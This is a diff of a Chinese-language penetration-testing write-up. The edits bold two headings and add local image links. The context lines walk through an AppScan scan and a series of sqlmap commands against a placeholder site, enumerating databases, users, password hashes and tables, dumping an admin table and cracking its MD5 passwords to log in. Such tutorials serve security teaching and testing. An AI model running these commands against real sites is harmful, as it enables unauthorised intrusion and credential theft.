@@ -4,7 +4,7 @@
 
 # 应用
 
-## 工具
+## **工具**
 
 1、AppScan渗透扫描工具
 
@@ -14,7 +14,7 @@ Appscan是Web应用程序渗透测试舞台上使用最广泛的工具之一。�
 
 Sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞。
 
-## 步骤
+## **步骤**
 
 ​	首先使用Appscan工具，对www.xxx.com互联网公司的官网进行扫描，扫描结果如下：
 
@@ -48,7 +48,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1
 
 结果：
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD458.tmp.jpg) 
 
 注入结果展示：
 
@@ -72,7 +72,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1  --dbs
 
 结果：
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD459.tmp.jpg) 
 
 结果显示该sqlserver中共包含3个可用的数据库。
 
@@ -88,13 +88,13 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 --current-db
 
 结果：
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD45A.tmp.jpg) 
 
 \4) 获取当前数据库使用账户
 
 python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 --current-user
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD46A.tmp.jpg) 
 
 \5) 列出sqlserver所有用户
 
@@ -102,7 +102,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 --users
 
  
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD46B.tmp.jpg) 
 
 \6) 获取当前用户数据库账户与密码
 
@@ -110,7 +110,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 –passwords
 
 结果显示该用户可能无读取相关系统的权限。
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD46C.tmp.jpg) 
 
 \7) 列出数据库中的表
 
@@ -124,7 +124,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 -D xxx_store --table
 
 结果：
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD47D.tmp.jpg) 
 
 结果显示共列出了69张表。
 
@@ -144,7 +144,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 -D xxx_store -T mall
 
 结果：
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD47E.tmp.jpg) 
 
 9)暴字段内容
 
@@ -170,7 +170,7 @@ python sqlmap.py -u http://www.xxx.com/system/cms/show?id=1 -D xxx_store -T mall
 
 结果如下：
 
- 
+![img](file:///C:\Users\大力\AppData\Local\Temp\ksohtml\wpsD47F.tmp.jpg) 
 
 通过上图，我们可以看到admin表中的用户信息了。我们将password字段通过md5解密，可以得到hash的原文密码，通过用户名和密码，我们就可以登录该网站了。
 
